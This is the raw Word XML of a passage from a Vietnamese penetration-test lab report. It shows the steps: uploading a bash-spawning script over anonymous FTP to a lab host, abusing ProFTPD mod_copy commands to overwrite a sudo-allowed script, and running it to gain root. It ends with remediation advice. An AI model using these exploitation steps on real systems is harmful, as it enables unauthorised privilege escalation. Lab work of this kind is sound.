    <w:p w14:paraId="5A24D6A5" w14:textId="77777777" w:rsidR="00F35241" w:rsidRDefault="00F35241" w:rsidP="00F35241">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 9. Tạo tệp script để nâng quyền</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524B5A3F" w14:textId="77777777" w:rsidR="00F35241" w:rsidRDefault="00F35241" w:rsidP="00F35241">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tạo tệp test chứa lệnh mở shell Bash, sau đó tải tệp lên FTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD208B7" w14:textId="77777777" w:rsidR="00F35241" w:rsidRDefault="00F35241" w:rsidP="00F35241">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh và nội dung tệp:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109FB664" w14:textId="77777777" w:rsidR="00F35241" w:rsidRDefault="00F35241" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4204404B" w14:textId="27A5288D" w:rsidR="0091031E" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091031E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Tạo file test với nội dung shell script echo -e "#!/bin/bash\n/bin/bash" &gt; test </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553E1D43" w14:textId="77777777" w:rsidR="0091031E" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091031E">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2. Kết nối tới FTP server và tự động đăng nhập anonymous, tải file test lên</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="107571BA" w14:textId="0807D2B0" w:rsidR="0091031E" w:rsidRPr="00F35241" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ftp  192.168.56.124 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E28A23" w14:textId="1E3477D7" w:rsidR="0091031E" w:rsidRPr="00F35241" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">user anonymous </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7051A63C" w14:textId="77777777" w:rsidR="0091031E" w:rsidRPr="00F35241" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">put test </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB886D6" w14:textId="77777777" w:rsidR="0091031E" w:rsidRPr="00F35241" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28953FC1" w14:textId="77777777" w:rsidR="0091031E" w:rsidRPr="00F35241" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cd upload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F21473" w14:textId="77777777" w:rsidR="0091031E" w:rsidRPr="00F35241" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>put test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EF6139" w14:textId="402B06F4" w:rsidR="0091031E" w:rsidRPr="00F35241" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ls </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7797E0BE" w14:textId="340A3181" w:rsidR="0091031E" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F35241">
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">quit </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30391397" w14:textId="18B1563C" w:rsidR="00F35241" w:rsidRPr="00F35241" w:rsidRDefault="00F35241" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tệp test được tạo trên Kali và tải thành công vào thư mục upload của FTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696AED67" w14:textId="0FCC4E87" w:rsidR="0091031E" w:rsidRDefault="0091031E" w:rsidP="008E300D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BED4306" wp14:editId="4830F693">
            <wp:extent cx="2628900" cy="809625"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="561117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117020" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2628900" cy="809625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="67A02122" w14:textId="6645EF1F" w:rsidR="00134469" w:rsidRPr="00F35241" w:rsidRDefault="00F35241">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75C2C622" wp14:editId="05F122C1">
            <wp:extent cx="6152515" cy="4476115"/>
            <wp:effectExtent l="0" t="0" r="635" b="635"/>
            <wp:docPr id="1169677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77379" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="4476115"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="528CEF14" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="03BCB6F9" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 10. Ghi đè script và thực thi bằng sudo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C426BA" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Sao chép tệp test vào vị trí script được phép chạy với sudo, sau đó thực thi để lấy quyền cao hơn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750E9737" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BCC1DAE" w14:textId="3E995B12" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>telnet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.56.124</w:t>
      </w:r>
      <w:r w:rsidR="00F35241">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709B6A0F" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>site cpfr /home/ftp/upload/test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1540B717" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>site cpto /home/patrick/script/test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EBCA7B9" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>quit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567B5127" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sudo /home/patrick/script/test</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E52334" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tệp script được thay thế và được thực thi bằng sudo. Kiểm tra terminal để xác nhận quyền truy cập đạt được.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28838953" w14:textId="7802C06A" w:rsidR="00134469" w:rsidRDefault="00F35241">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C9C8BC9" wp14:editId="476039DA">
            <wp:extent cx="6152515" cy="2369185"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="27685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5775" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2369185"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A6FBB2" w14:textId="21AABAE4" w:rsidR="00F35241" w:rsidRDefault="00F35241">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2DD073E7" wp14:editId="5ECE4C81">
            <wp:extent cx="6152515" cy="1772285"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="1141405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405694" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1772285"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5937F1FE" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="524B89FE" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="36F9C49E" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="26F8B818" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>3. Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBB2A44" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Quá trình kiểm thử đã xác định dịch vụ FTP cho phép đăng nhập anonymous, khai thác chức năng mod_copy để đưa backdoor lên máy chủ web, tạo reverse shell và khai thác cấu hình sudo không an toàn để nâng quyền. Hệ thống cần vô hiệu hóa anonymous FTP, cập nhật ProFTPD, hạn chế quyền ghi và cấu hình lại sudo theo nguyên tắc đặc quyền tối thiểu.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00134469"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94D3003"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1FBE2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804109">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1936327843">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1969503619">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="300693699">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1277982127">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1360669404">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="36903186">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="258562366">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="529299046">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="18725246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4469"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="0069713C"/>
    <w:rsid w:val="008E300D"/>
    <w:rsid w:val="0091031E"/>
    <w:rsid w:val="00976D57"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D31387"/>
    <w:rsid w:val="00D32D38"/>
    <w:rsid w:val="00D84A91"/>
    <w:rsid w:val="00DB4693"/>
    <w:rsid w:val="00F35241"/>
    <w:rsid w:val="00FA13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D11E67"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{AB5CB54C-4086-4B96-A0B2-68B6E559C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1</Pages>
  <Words>688</Words>
  <Characters>3928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Manh Duc 20230247P</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-28T09:59:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>